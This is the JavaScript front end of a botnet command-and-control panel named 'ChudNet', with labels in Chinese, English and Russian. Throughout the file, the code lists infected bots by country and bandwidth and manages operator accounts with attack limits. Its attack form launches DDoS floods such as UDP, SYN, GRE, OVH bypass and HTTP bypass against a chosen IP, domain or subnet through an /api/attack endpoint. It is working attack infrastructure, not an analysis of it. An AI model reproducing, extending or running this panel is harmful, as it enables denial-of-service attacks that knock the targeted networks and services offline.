var Tr={zh:{logout:"退出",login:"登录",loginTitle:"ChudNet 管理面板",user:"用户名",pass:"密码",loginBtn:"登录",loginErr:"用户名或密码错误",noConn:"无法连接到服务器",fillCreds:"请输入用户名和密码",dashboard:"仪表盘",attack:"攻击中心",bots:"Bot管理",users:"用户管理",history:"攻击历史",botOnline:"在线Bot",botFree:"空闲",botBusy:"忙碌",botAttacking:"攻击中",botBw:"带宽 Gbps",target:"目标 IP / 域名",port:"端口",duration:"持续时间",seconds:"秒",country:"国家",allCountries:"全部国家",method:"攻击方式",layer:"攻击层级",l4:"L4传输层",l7:"L7应用层",subnet:"子网 (CIDR)",subnetHint:"/24≈256个IP · /28≈16个IP · /32=单个目标",concurrency:"Bot数",extraOpts:"额外选项",optKey:"参数名",optVal:"参数值",launch:"发起攻击",sending:"发送中...",attackSent:"已发送!",attackFail:"发送失败",netErr:"网络错误",fillFields:"请填写攻击方式、目标IP和持续时间",attackControl:"攻击控制",attackControlDesc:"设置参数后发起攻击",activeAttacks:"进行中的攻击",activeAttacksDesc:"实时攻击状态",noActive:"暂无进行中的攻击",botList:"在线Bot",botSearch:"搜索IP或国家...",botAllStatus:"全部状态",botStatusFree:"空闲",botStatusBusy:"忙碌",botUnknown:"未知",noBots:"无匹配的Bot",noBotsConn:"暂无Bot连接",userList:"用户列表",addUser:"添加用户",createUserBtn:"添加用户",deleteConfirm:"确定删除用户",admin:"管理员",userRole:"用户",yes:"是",no:"否",deleteBtn:"删除",historyTitle:"攻击历史",noHistory:"暂无攻击记录",userMsgEmpty:"用户名和密码不能为空",userAdded:"添加成功",userAddFail:"添加失败",userDeleted:"已删除",userDelFail:"失败",botId:"ID",botIp:"IP",botCountry:"国家",botVer:"版本",botState:"状态",botSpeed:"带宽",distTitle:"僵尸网络分布",count:"数量",percent:"占比"},en:{logout:"Logout",login:"Login",loginTitle:"ChudNet Panel",user:"Username",pass:"Password",loginBtn:"Login",loginErr:"Invalid credentials",noConn:"Connection failed",fillCreds:"Enter username and password",dashboard:"Dashboard",attack:"Attack",bots:"Bots",users:"Users",history:"History",botOnline:"Online",botFree:"Idle",botBusy:"Busy",botAttacking:"Attacking",botBw:"Bandwidth Gbps",target:"Target IP/Domain",port:"Port",duration:"Duration",seconds:"s",country:"Country",allCountries:"All",method:"Method",layer:"Layer",l4:"L4 Transport",l7:"L7 Application",subnet:"Subnet (CIDR)",subnetHint:"/24≈256 IPs · /28≈16 IPs · /32=single target",concurrency:"Slots",extraOpts:"Options",optKey:"Key",optVal:"Value",launch:"Launch Attack",sending:"Launching...",attackSent:"Sent!",attackFail:"Failed",netErr:"Network Error",fillFields:"Fill method, target IP, and duration",attackControl:"Attack Control",attackControlDesc:"Set parameters before launch",activeAttacks:"Active Attacks",activeAttacksDesc:"Live operations overview",noActive:"No active attacks",botList:"Online Bots",botSearch:"Search IP or country...",botAllStatus:"All",botStatusFree:"Idle",botStatusBusy:"Busy",botUnknown:"Unknown",noBots:"No matching bots",noBotsConn:"No bots connected",userList:"User List",addUser:"Add User",createUserBtn:"Add User",deleteConfirm:"Delete user",admin:"Admin",userRole:"User",yes:"Yes",no:"No",deleteBtn:"Delete",historyTitle:"Attack History",noHistory:"No history",userMsgEmpty:"Username and password required",userAdded:"User added",userAddFail:"Add failed",userDeleted:"Deleted",userDelFail:"Failed",botId:"ID",botIp:"IP",botCountry:"Country",botVer:"Version",botState:"Status",botSpeed:"Speed",distTitle:"Bot Distribution",count:"Count",percent:"Share"},ru:{logout:"Выход",login:"Вход",loginTitle:"ChudNet Панель",user:"Логин",pass:"Пароль",loginBtn:"Войти",loginErr:"Неверные данные",noConn:"Ошибка связи",fillCreds:"Введите логин и пароль",dashboard:"Панель",attack:"Атака",bots:"Боты",users:"Пользователи",history:"История",botOnline:"Онлайн",botFree:"Свободны",botBusy:"Заняты",botAttacking:"Атакуют",botBw:"Пропуск Гбит/с",target:"Цель IP/Домен",port:"Порт",duration:"Длительность",seconds:"с",country:"Страна",allCountries:"Все",method:"Метод",layer:"Уровень",l4:"L4 Транспорт",l7:"L7 Приложение",subnet:"Подсеть (CIDR)",subnetHint:"/24≈256 IP · /28≈16 IP · /32=одна цель",concurrency:"Потоки",extraOpts:"Опции",optKey:"Ключ",optVal:"Значение",launch:"Запустить",sending:"Запуск...",attackSent:"Отправлено!",attackFail:"Ошибка",netErr:"Ошибка сети",fillFields:"Заполните метод, цель и время",attackControl:"Управление",attackControlDesc:"Настройте параметры",activeAttacks:"Активные атаки",activeAttacksDesc:"Текущие операции",noActive:"Нет активных атак",botList:"Боты онлайн",botSearch:"Поиск IP или страны...",botAllStatus:"Все",botStatusFree:"Свободен",botStatusBusy:"Занят",botUnknown:"Неизвестно",noBots:"Нет совпадений",noBotsConn:"Нет подключений",userList:"Список",addUser:"Добавить",createUserBtn:"Создать",deleteConfirm:"Удалить пользователя",admin:"Админ",userRole:"Юзер",yes:"Да",no:"Нет",deleteBtn:"Удалить",historyTitle:"История атак",noHistory:"Нет записей",userMsgEmpty:"Логин и пароль обязательны",userAdded:"Добавлен",userAddFail:"Ошибка",userDeleted:"Удалён",userDelFail:"Ошибка",botId:"ID",botIp:"IP",botCountry:"Страна",botVer:"Версия",botState:"Статус",botSpeed:"Скорость",distTitle:"Распределение",count:"Кол-во",percent:"Доля"}};
function T(k){var d=Tr[curLang]||Tr.en;return d[k]||(Tr.en[k]||k)}
function setLang(l){curLang=l;localStorage.setItem("c_lang",l);document.getElementById("langSel").value=l;translateUI()}
function translateUI(){
document.querySelectorAll("[data-key]").forEach(function(el){
var k=el.dataset.key;
if(k==="user-ph"){el.placeholder=T("user");return}
if(k==="pass-ph"){el.placeholder=T("pass");return}
if(el.childElementCount===0&&el.tagName!=="SELECT"){el.textContent=T(k);return}
// Element has children: only translate the text content of childless nodes
el.childNodes.forEach(function(n){if(n.nodeType===3&&n.textContent.trim()){n.textContent=T(k);return}})
});
// Dropdowns
var cs=document.getElementById("atkCountry");if(cs&&cs.options[0])cs.options[0].textContent=T("allCountries");
document.getElementById("langSel")&&document.getElementById("langSel").value===curLang;
}
var methodCats={l4:["udp","vse","udpplain","udprand","syn","ack","stomp","tcp","std","stdhex","icmp","greip","greth","ssh","ovh"],l7:["http","httpbypass","raknet","discord","minecraft","mc-cps"]};

function ready(fn){
if(document.readyState!=="loading"){fn()}else{document.addEventListener("DOMContentLoaded",fn)}
}
ready(function initApp(){
if(token){showApp()}else{loadGroups();loadUsers();loadHistory()}
var lu=document.getElementById("lu"),lp=document.getElementById("lp"),lb=document.getElementById("loginBtn");
if(lb)lb.onclick=doLogin;
lu&&lu.addEventListener("keydown",function(e){if(e.key==="Enter")doLogin()});
lp&&lp.addEventListener("keydown",function(e){if(e.key==="Enter")doLogin()});
});

function toggleSidebar(){
var s=document.getElementById("sidebar");
var o=document.getElementById("sidebarOverlay");
s.classList.toggle("open");o.classList.toggle("show");
}
function closeSidebar(){
document.getElementById("sidebar").classList.remove("open");
document.getElementById("sidebarOverlay").classList.remove("show");
}

function api(path,cb,method,body){
var sep=path.indexOf("?")>-1?"&":"?";
var url=path+sep+"token="+encodeURIComponent(token);
var opts={method:method||"GET",headers:{}};
if(body){opts.method="POST";opts.headers["Content-Type"]="application/json";opts.body=JSON.stringify(body)}
fetch(url,opts).then(function(r){return r.json()}).then(function(d){
if(!d.success&&d.error==="未登录或会话已过期"){doLogout();return}
cb(d)
}).catch(function(){})
}

function doLogin(){
var u=document.getElementById("lu").value.trim();
var p=document.getElementById("lp").value;
if(!u||!p){var e=document.getElementById("loginErr");if(e){e.textContent=T("fillCreds");e.style.display="block"};return}
var ee=document.getElementById("loginErr");if(ee)ee.style.display="none";
fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u,password:p})})
.then(function(r){return r.json()}).then(function(d){
if(d.success){token=d.token;username=d.username;isAdmin=d.admin;localStorage.setItem("c_token",token);showApp()}else{var e=document.getElementById("loginErr");if(e){e.textContent=d.error||T("loginErr");e.style.display="block"}}
}).catch(function(){var e=document.getElementById("loginErr");if(e){e.textContent=T("noConn");e.style.display="block"}})
}

function showLErr(m){var e=document.getElementById("loginErr");e.textContent=m;e.style.display=m?"block":"none"}
function doLogout(){token="";localStorage.removeItem("c_token");document.getElementById("loginScreen").classList.remove("hidden");document.getElementById("app").classList.add("hidden")}
function showApp(){
document.getElementById("loginScreen").classList.add("hidden");
var app=document.getElementById("app");if(app)app.classList.remove("hidden");
var hdr=document.getElementById("hdrUser");if(hdr)hdr.textContent=username;
if(isAdmin){var elems=document.querySelectorAll(".admin-only");if(elems)elems.forEach(function(e){e.classList.remove("hidden")})}
initSSE();loadGroups();loadUsers();loadHistory();setTimeout(translateUI,300);
}

function switchTab(t){
document.querySelectorAll(".tab").forEach(function(e){e.classList.remove("active")});
document.querySelectorAll(".nav-item").forEach(function(e){e.classList.remove("active")});
var tp=document.getElementById("tab-"+t);
if(tp)tp.classList.add("active");
var ni=document.querySelector('.nav-item[data-tab="'+t+'"]');
if(ni)ni.classList.add("active");
var titles={dashboard:T("dashboard"),attack:T("attack"),bots:T("bots"),users:T("users"),history:T("history")};
document.getElementById("pageTitle").textContent=titles[t]||"";
if(t==="bots")loadGroups();
if(t==="users"&&isAdmin)loadUsers();
if(t==="history")loadHistory();
setTimeout(translateUI,100);
}

function setLayer(layer){
activeLayer=layer;
document.querySelectorAll(".rs-layer-tab").forEach(function(b){b.classList.toggle("active",b.dataset.layer===layer)});
populateMethods();
}

function toggleHttpFields(){
var m=document.getElementById("atkMethod").value;
var isHttp=(m==="http"||m==="httpbypass");
document.getElementById("normalFields").style.display=isHttp?"none":"";
document.getElementById("httpFields").style.display=isHttp?"":"none";
}
function parseUrl(u){
var port=80,host=u,path="/",tls="";
if(u.startsWith("https://")){port=443;tls="tls=1";u=u.substring(8)}
else if(u.startsWith("http://")){u=u.substring(7)}
var si=u.indexOf("/");if(si>-1){path=u.substring(si);host=u.substring(0,si)}
var ci=host.indexOf(":");if(ci>-1){port=parseInt(host.substring(ci+1))||80;host=host.substring(0,ci)}
return{host:host,port:port,path:path,tls:tls};
}
function populateMethods(){
var sel=document.getElementById("atkMethod");
if(!sel)return;
var m=methodCats[activeLayer]||[];
sel.innerHTML="";
m.forEach(function(n){var o=document.createElement("option");o.value=n;o.textContent=n.toUpperCase();sel.appendChild(o)});
toggleHttpFields();
}
function loadStats(){
api("/api/bots",function(d){
if(!d.success)return;
var h='<div class="stat-card"><div class="value">'+d.total+'</div><div class="label">'+T('botOnline')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.free+'</div><div class="label">'+T('botFree')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.busy+'</div><div class="label">'+T('botBusy')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.activeAttacks+'</div><div class="label">'+T('botAttacking')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.speedGbps.toFixed(2)+'</div><div class="label">'+T('botBw')+'</div></div>';
document.getElementById("statsWrap").innerHTML=h;
var ms=document.getElementById("atkMethod");
if(ms&&ms.options.length===0)populateMethods();
var cs=document.getElementById("atkCountry");
if(d.distribution){var ex={};for(var i=0;i<cs.options.length;i++)ex[cs.options[i].value]=true;
Object.keys(d.distribution).sort().forEach(function(c){if(!c||ex[c])return;ex[c]=true;var o=document.createElement("option");o.value=c;o.textContent=c+" ("+d.distribution[c]+")";cs.appendChild(o)})}

})
}

function loadDists(){
api("/api/bots",function(d){
if(!d.success)return;
var total=d.total||1,h="";
if(d.distribution){Object.keys(d.distribution).sort(function(a,b){return d.distribution[b]-d.distribution[a]}).forEach(function(c){
var pct=((d.distribution[c]/total)*100).toFixed(1);
h+='<tr><td><span class="badge badge-country">'+c+'</span></td><td>'+d.distribution[c]+'</td><td>'+pct+'%</td></tr>';
})}
document.getElementById("distTbody").innerHTML=h||'<tr class="empty-row"><td colspan="3">暂无Bot连接</td></tr>';
})
}

function loadGroups(){
api("/api/groups",function(d){
if(!d.success)return;
var gs=d.groups||[];
gs.sort(function(a,b){return b.count-a.count});
document.getElementById("groupCount").textContent="("+gs.length+")";
var ds=function(v){return v>0?"badge-online":v<0?"badge-busy":"badge-country"};
var df=function(v){return v>0?"+"+v:v};
var h="";
gs.forEach(function(g){h+='<tr><td><span class="badge badge-country">'+g.name+'</span></td><td>'+g.count+'</td><td>'+g.total_gbps.toFixed(2)+' Gbps</td><td>'+g.avg_mbps.toFixed(1)+' Mb/s</td><td><span class="badge '+ds(g.delta_24h)+'">'+df(g.delta_24h)+'</span></td></tr>'});
document.getElementById("groupTbody").innerHTML=h||'<tr class="empty-row"><td colspan="5">'+T('noBotsConn')+'</td></tr>';
})
}

function loadUsers(){
if(!isAdmin)return;
api("/api/users",function(d){
if(!d.success)return;
var h="";
(d.users||[]).forEach(function(u){
h+='<tr><td>'+u.username+'</td><td>'+u.max_bots+'</td><td>'+u.duration_limit+'s</td><td>'+u.cooldown+'s</td>'+
'<td>'+(u.proxy_allowed?T('yes'):T('no'))+'</td><td><span class="badge '+(u.admin?'badge-admin':'badge-free')+'">'+(u.admin?T('admin'):T('userRole'))+'</span></td>'+
'<td>'+(u.admin?T('admin'):'<button class="btn btn-red btn-small" onclick="removeUser(\''+u.username+'\')">删除</button>')+'</td></tr>';
})
document.getElementById("userTbody").innerHTML=h||'<tr class="empty-row"><td colspan="7">暂无用户</td></tr>';
})
}

function createUser(){
var u=document.getElementById("newUser").value.trim();
var p=document.getElementById("newPass").value.trim();
if(!u||!p){showUserMsg("用户名和密码不能为空",0);return}
api("/api/users/create",function(d){
if(d.success){showUserMsg("添加成功",1);loadUsers();document.getElementById("newUser").value="";document.getElementById("newPass").value=""}
else showUserMsg(d.error||"添加失败",0)
},"POST",{username:u,password:p,
max_bots:parseInt(document.getElementById("newBots").value)||-1,
duration:parseInt(document.getElementById("newDur").value)||300,
cooldown:parseInt(document.getElementById("newCool").value)||5,
proxy_allowed:parseInt(document.getElementById("newProxy").value)||0
})
}

function removeUser(u){
if(!confirm("确定删除用户 "+u+"?"))return;
api("/api/users/remove",function(d){
if(d.success){showUserMsg("已删除",1);loadUsers()}else showUserMsg(d.error||"失败",0)
},"POST",{username:u})
}

function showUserMsg(m,ok){var e=document.getElementById("userMsg");e.textContent=m;e.className="result-msg "+(ok?"result-ok":"result-err");e.style.display="block";setTimeout(function(){e.style.display="none"},3500)}

function loadHistory(){
api("/api/history",function(d){
if(!d.success||!d.history)return;
var h="";
d.history.slice().reverse().slice(0,100).forEach(function(e){
var t=new Date(e.time_sent*1000);
var ts=t.getFullYear()+"-"+String(t.getMonth()+1).padStart(2,"0")+"-"+String(t.getDate()).padStart(2,"0")+" "+String(t.getHours()).padStart(2,"0")+":"+String(t.getMinutes()).padStart(2,"0");
h+='<tr><td>'+ts+'</td><td>'+(e.command||"")+'</td><td>'+e.duration+'s</td><td>'+e.max_bots+'</td></tr>';
})
document.getElementById("histTbody").innerHTML=h||'<tr class="empty-row"><td colspan="4">暂无攻击记录</td></tr>';
})
}

function addOpt(){
var k=document.getElementById("optKey").value.trim();
var v=document.getElementById("optVal").value.trim();
if(!k||!v)return;
optList.push({key:k,val:v});
document.getElementById("optKey").value="";document.getElementById("optVal").value="";
renderOpts()
}
function removeOpt(i){optList.splice(i,1);renderOpts()}
function renderOpts(){
var h="";
optList.forEach(function(o,i){h+='<span class="tag">'+o.key+'='+o.val+' <span class="rm" onclick="removeOpt('+i+')">x</span></span>'})
document.getElementById("optTags").innerHTML=h
}

function sendAttack(){
var m=document.getElementById("atkMethod").value;
var t=document.getElementById("atkTime").value.trim();
var bots=document.getElementById("atkSlots").value.trim();
var opts=[];optList.forEach(function(o){opts.push(o.key+"="+o.val)});
if(bots&&parseInt(bots)>0)opts.push("bots="+bots);
var host,p,c,subnet,isHttp=(m==="http"||m==="httpbypass");
if(isHttp){
var u=document.getElementById("atkUrl").value.trim();
if(!u){showAtkResult("请输入目标URL",false);return}
var pu=parseUrl(u);
host=pu.host;p=pu.port;c="";subnet="";
opts.push("path="+pu.path);
if(pu.tls)opts.push(pu.tls);
}else{
host=document.getElementById("atkHost").value.trim();
p=document.getElementById("atkPort").value.trim();
c=document.getElementById("atkCountry").value;
subnet=document.getElementById("atkSubnet").value.trim();
}
if(!m||!host||!t){showAtkResult(T("fillFields"),false);return}
if(!isHttp&&subnet&&subnet!=="32")host=host+"/"+subnet;
var url="/api/attack?user="+encodeURIComponent(username)+"&apikey="+encodeURIComponent(token)+"&host="+encodeURIComponent(host)+"&method="+encodeURIComponent(m)+"&time="+encodeURIComponent(t);
if(p)url+="&port="+encodeURIComponent(p);
if(opts.length)url+="&option="+encodeURIComponent(opts.join("&"));
if(!isHttp&&c)url+="&source="+encodeURIComponent(c);
var btn=document.getElementById("atkBtn");var btnt=document.getElementById("atkBtnText");
btn.disabled=true;btnt.textContent=T("sending");
fetch(url).then(function(r){return r.json()}).then(function(d){
btn.disabled=false;btnt.textContent=T("launch");
if(d.success)showAtkResult(T("attackSent")+" "+host+" | "+m+" | "+t+"s | Bot "+d.bots,true);
else showAtkResult(d.error||T("attackFail"),false)
}).catch(function(){btn.disabled=false;btnt.textContent=T("launch");showAtkResult(T("netErr"),false)})
}

function showAtkResult(m,ok){var e=document.getElementById("atkResult");e.textContent=m;e.className="result-msg "+(ok?"result-ok":"result-err");e.style.display="block"}

var es=null;
function initSSE(){
if(!token)return;
if(es){es.close()}
es=new EventSource("/api/events?token="+encodeURIComponent(token));
es.onmessage=function(e){
try{var d=JSON.parse(e.data);
document.getElementById("statsWrap").innerHTML=
'<div class="stat-card"><div class="value">'+d.total+'</div><div class="label">'+T('botOnline')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.free+'</div><div class="label">'+T('botFree')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.busy+'</div><div class="label">'+T('botBusy')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.activeAttacks+'</div><div class="label">'+T('botAttacking')+'</div></div>'+
'<div class="stat-card"><div class="value">'+d.speedGbps.toFixed(2)+'</div><div class="label">'+T('botBw')+'</div></div>';
if(document.getElementById("atkMethod")&&document.getElementById("atkMethod").options.length===0)populateMethods();
var cs=document.getElementById("atkCountry");
if(d.distribution){var ex={};for(var i=0;i<cs.options.length;i++)ex[cs.options[i].value]=true;
Object.keys(d.distribution).sort().forEach(function(c){if(!c||ex[c])return;ex[c]=true;var o=document.createElement("option");o.value=c;o.textContent=c+" ("+d.distribution[c]+")";cs.appendChild(o)})}

var total=d.total||1,html="";
if(d.distribution){Object.keys(d.distribution).sort(function(a,b){return d.distribution[b]-d.distribution[a]}).forEach(function(c){
var pct=((d.distribution[c]/total)*100).toFixed(1);
html+='<tr><td><span class="badge badge-country">'+c+'</span></td><td>'+d.distribution[c]+'</td><td>'+pct+'%</td></tr>';
})}
document.getElementById("distTbody").innerHTML=html||'<tr class="empty-row"><td colspan="3">暂无Bot连接</td></tr>';
}catch(ex){}
};
es.onerror=function(){es.close();setTimeout(initSSE,5000)};
}
</script>
</body>
</html>`
